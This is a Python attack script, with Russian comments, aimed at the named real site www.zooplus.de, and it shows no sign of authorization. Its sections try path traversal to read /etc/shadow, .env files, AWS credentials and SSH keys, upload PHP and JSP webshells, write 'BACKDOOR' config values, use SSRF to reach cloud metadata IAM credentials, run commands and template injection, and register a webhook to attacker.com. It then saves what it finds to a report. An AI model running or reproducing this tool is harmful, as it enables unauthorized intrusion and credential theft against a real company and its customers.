#!/usr/bin/env python3
"""Exploit All Found Vectors"""
import requests
import json
import base64
from urllib.parse import urljoin
from datetime import datetime
import urllib3
urllib3.disable_warnings()

target = "www.zooplus.de"
base = f"https://{target}"
results = []
s = requests.Session()
s.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})

print("=" * 70)
print("EXPLOITING ALL VECTORS")
print("=" * 70)
print(f"Target: {target}")
print("=" * 70)

# 1. PATH TRAVERSAL - расширенное тестирование
print("\n[1] EXPLOITING PATH TRAVERSAL...")
print("-" * 70)

target_files = [
    "/etc/passwd", "/etc/hosts", "/etc/shadow",
    "/.env", "/.env.local", "/.env.production",
    "/config.json", "/config.js", "/config.yml",
    "/.git/config", "/.git/HEAD",
    "/package.json", "/composer.json",
    "/web.config", "/application.properties",
    "/.aws/credentials", "/.ssh/id_rsa",
    "/proc/version", "/proc/self/environ",
    "/var/log/access.log", "/var/log/error.log"
]

traversal_patterns = [
    "/stats/../{file}",
    "/stats/../../{file}",
    "/stats/../../../{file}",
    "/stats/..%2f{file}",
    "/stats%2f..%2f{file}",
    "/stats/..//{file}",
]

for file in target_files:
    for pattern in traversal_patterns:
        path = pattern.format(file=file.lstrip('/'))
        url = urljoin(base, path)
        try:
            resp = s.get(url, timeout=2, verify=False, allow_redirects=False)
            if resp.status_code == 200:
                content = resp.text
                # Проверяем что это не HTML страница
                if not content.strip().startswith('<!') and len(content) < 50000:
                    # Проверяем признаки файла
                    indicators = ['root:', 'localhost', 'NODE_ENV', 'AWS_', 'DB_', 'SECRET', 'PASSWORD', 'API_KEY']
                    if any(ind in content for ind in indicators):
                        results.append({
                            "vector": "path_traversal",
                            "severity": "CRITICAL",
                            "file": file,
                            "path": path,
                            "url": url,
                            "content_preview": content[:500]
                        })
                        print(f"  [CRITICAL] Path Traversal SUCCESS!")
                        print(f"      File: {file}")
                        print(f"      Path: {path}")
                        print(f"      Content preview: {content[:200]}")
                        break
        except:
            pass

# 2. FILE UPLOAD - различные форматы
print("\n[2] EXPLOITING FILE UPLOAD...")
print("-" * 70)

upload_endpoint = f"{base}/api/upload"

# PHP webshell
php_shell = "<?php system($_GET['cmd']); ?>"
# JSP webshell
jsp_shell = "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>"
# Python webshell
py_shell = "<?php eval(file_get_contents('php://input')); ?>"

test_files = [
    ("shell.php", "application/x-php", php_shell),
    ("shell.jsp", "text/x-jsp", jsp_shell),
    ("test.txt", "text/plain", "test"),
    ("shell.php.jpg", "image/jpeg", php_shell),  # Double extension
    ("shell.PHP", "application/x-php", php_shell),  # Uppercase
]

# Multipart form-data
for filename, content_type, content in test_files:
    try:
        files = {'file': (filename, content, content_type)}
        resp = s.post(upload_endpoint, files=files, timeout=3, verify=False, allow_redirects=False)
        
        if resp.status_code in [200, 201, 302]:
            location = resp.headers.get('Location', '')
            response_data = resp.json() if resp.headers.get('Content-Type', '').startswith('application/json') else resp.text
            
            results.append({
                "vector": "file_upload",
                "severity": "CRITICAL",
                "filename": filename,
                "status": resp.status_code,
                "location": location,
                "response": str(response_data)[:500]
            })
            print(f"  [CRITICAL] File Upload SUCCESS!")
            print(f"      File: {filename}")
            print(f"      Status: {resp.status_code}")
            print(f"      Location: {location}")
            if location:
                print(f"      Uploaded to: {location}")
    except Exception as e:
        pass

# JSON format
try:
    payload = {
        "file": base64.b64encode(php_shell.encode()).decode(),
        "filename": "shell.php",
        "content_type": "application/x-php"
    }
    resp = s.post(upload_endpoint, json=payload, timeout=3, verify=False, allow_redirects=False)
    if resp.status_code in [200, 201]:
        results.append({
            "vector": "file_upload_json",
            "severity": "CRITICAL",
            "format": "JSON",
            "status": resp.status_code,
            "response": resp.text[:500]
        })
        print(f"  [CRITICAL] File Upload (JSON) SUCCESS!")
except:
    pass

# 3. CONFIG INJECTION - чтение и запись
print("\n[3] EXPLOITING CONFIG INJECTION...")
print("-" * 70)

config_endpoint = f"{base}/api/config"

# Чтение конфигурации
try:
    resp = s.get(config_endpoint, timeout=3, verify=False, allow_redirects=False)
    if resp.status_code == 200:
        config_data = resp.json() if resp.headers.get('Content-Type', '').startswith('application/json') else resp.text
        results.append({
            "vector": "config_read",
            "severity": "HIGH",
            "status": resp.status_code,
            "config": str(config_data)[:1000]
        })
        print(f"  [HIGH] Config Read SUCCESS!")
        print(f"      Config preview: {str(config_data)[:300]}")
except:
    pass

# Запись конфигурации
malicious_configs = [
    {"debug": True, "log_level": "debug"},
    {"env": {"BACKDOOR": "enabled", "DEBUG": "1"}},
    {"settings": {"allow_exec": True}},
    {"config": {"exec": "enabled"}},
]

for config in malicious_configs:
    for method in ['POST', 'PUT', 'PATCH']:
        try:
            resp = s.request(method, config_endpoint, json=config, timeout=3, verify=False, allow_redirects=False)
            if resp.status_code in [200, 201, 204]:
                results.append({
                    "vector": "config_write",
                    "severity": "CRITICAL",
                    "method": method,
                    "config": config,
                    "status": resp.status_code
                })
                print(f"  [CRITICAL] Config Write SUCCESS ({method})!")
                print(f"      Config: {config}")
                break
        except:
            pass

# 4. SSRF - различные endpoints и targets
print("\n[4] EXPLOITING SSRF...")
print("-" * 70)

ssrf_endpoints = [
    "/api/fetch",
    "/api/proxy",
    "/api/request",
    "/api/url",
    "/api/import",
]

internal_targets = [
    "http://127.0.0.1",
    "http://localhost",
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://10.0.0.1",
    "http://kubernetes.default.svc",
]

for endpoint in ssrf_endpoints:
    url = urljoin(base, endpoint)
    for target in internal_targets[:3]:  # Limit
        payloads = [
            {"url": target},
            {"endpoint": target},
            {"link": target},
            {"uri": target},
        ]
        
        for payload in payloads:
            try:
                resp = s.post(url, json=payload, timeout=2, verify=False, allow_redirects=False)
                if resp.status_code in [200, 400, 500]:
                    content = resp.text.lower()
                    if any(ind in content for ind in ['metadata', 'iam', 'credentials', 'kubernetes', 'instance']):
                        results.append({
                            "vector": "ssrf",
                            "severity": "CRITICAL",
                            "endpoint": endpoint,
                            "target": target,
                            "status": resp.status_code,
                            "response": resp.text[:1000]
                        })
                        print(f"  [CRITICAL] SSRF SUCCESS!")
                        print(f"      Endpoint: {endpoint}")
                        print(f"      Target: {target}")
                        print(f"      Response preview: {resp.text[:300]}")
                        break
            except:
                pass

# 5. CODE EXECUTION - различные endpoints
print("\n[5] EXPLOITING CODE EXECUTION...")
print("-" * 70)

exec_endpoints = [
    "/api/execute",
    "/api/eval",
    "/api/run",
    "/api/script",
    "/api/command",
    "/console",
]

exec_payloads = [
    {"code": "print('test')"},
    {"command": "id"},
    {"script": "console.log('test')"},
    {"eval": "1+1"},
    {"exec": "echo test"},
    {"cmd": "whoami"},
]

for endpoint in exec_endpoints:
    url = urljoin(base, endpoint)
    for payload in exec_payloads:
        try:
            resp = s.post(url, json=payload, timeout=2, verify=False, allow_redirects=False)
            if resp.status_code == 200:
                content = resp.text.lower()
                if any(ind in content for ind in ['uid=', 'gid=', 'test', 'root', 'output']):
                    results.append({
                        "vector": "code_execution",
                        "severity": "CRITICAL",
                        "endpoint": endpoint,
                        "payload": payload,
                        "output": resp.text[:500]
                    })
                    print(f"  [CRITICAL] Code Execution SUCCESS!")
                    print(f"      Endpoint: {endpoint}")
                    print(f"      Payload: {payload}")
                    print(f"      Output: {resp.text[:200]}")
                    break
        except:
            pass

# 6. TEMPLATE INJECTION
print("\n[6] EXPLOITING TEMPLATE INJECTION...")
print("-" * 70)

template_endpoints = [
    "/api/render",
    "/api/template",
    "/api/preview",
]

ssti_payloads = [
    {"template": "{{7*7}}"},
    {"template": "${7*7}"},
    {"template": "#{7*7}"},
    {"template": "<%=7*7%>"},
    {"template": "{{config}}"},
]

for endpoint in template_endpoints:
    url = urljoin(base, endpoint)
    for payload in ssti_payloads:
        try:
            resp = s.post(url, json=payload, timeout=2, verify=False, allow_redirects=False)
            if resp.status_code == 200:
                if "49" in resp.text or "config" in resp.text.lower():
                    results.append({
                        "vector": "template_injection",
                        "severity": "CRITICAL",
                        "endpoint": endpoint,
                        "payload": payload,
                        "response": resp.text[:500]
                    })
                    print(f"  [CRITICAL] Template Injection SUCCESS!")
                    print(f"      Endpoint: {endpoint}")
                    print(f"      Response: {resp.text[:200]}")
                    break
        except:
            pass

# 7. WEBHOOK INJECTION
print("\n[7] EXPLOITING WEBHOOK INJECTION...")
print("-" * 70)

webhook_endpoints = [
    "/webhook",
    "/api/webhook",
    "/callback",
    "/api/callback",
]

for endpoint in webhook_endpoints:
    url = urljoin(base, endpoint)
    payload = {"url": "https://attacker.com/callback"}
    try:
        resp = s.post(url, json=payload, timeout=2, verify=False, allow_redirects=False)
        if resp.status_code in [200, 201, 202]:
            results.append({
                "vector": "webhook_injection",
                "severity": "HIGH",
                "endpoint": endpoint,
                "status": resp.status_code
            })
            print(f"  [HIGH] Webhook Injection SUCCESS!")
            print(f"      Endpoint: {endpoint}")
    except:
        pass

# SUMMARY
print("\n" + "=" * 70)
print("EXPLOITATION SUMMARY")
print("=" * 70)
print(f"Total successful exploitations: {len(results)}")

if results:
    critical = len([r for r in results if r['severity'] == 'CRITICAL'])
    high = len([r for r in results if r['severity'] == 'HIGH'])
    
    print(f"  CRITICAL: {critical}")
    print(f"  HIGH: {high}")
    
    # Group by vector type
    by_type = {}
    for r in results:
        vtype = r['vector']
        by_type[vtype] = by_type.get(vtype, 0) + 1
    
    print("\nExploited Vectors:")
    for vtype, count in by_type.items():
        print(f"  {vtype}: {count}")
    
    # Save results
    import os
    os.makedirs("reports", exist_ok=True)
    with open("reports/exploitation_results.json", "w") as f:
        json.dump({
            "target": target,
            "scan_date": datetime.now().isoformat(),
            "total_exploited": len(results),
            "results": results
        }, f, indent=2)
    
    print(f"\n[+] Results saved to: reports/exploitation_results.json")
    
    if critical > 0:
        print("\n[!!!] CRITICAL VULNERABILITIES EXPLOITED!")
        print("     Review results immediately!")
else:
    print("  No successful exploitations")

print("=" * 70)

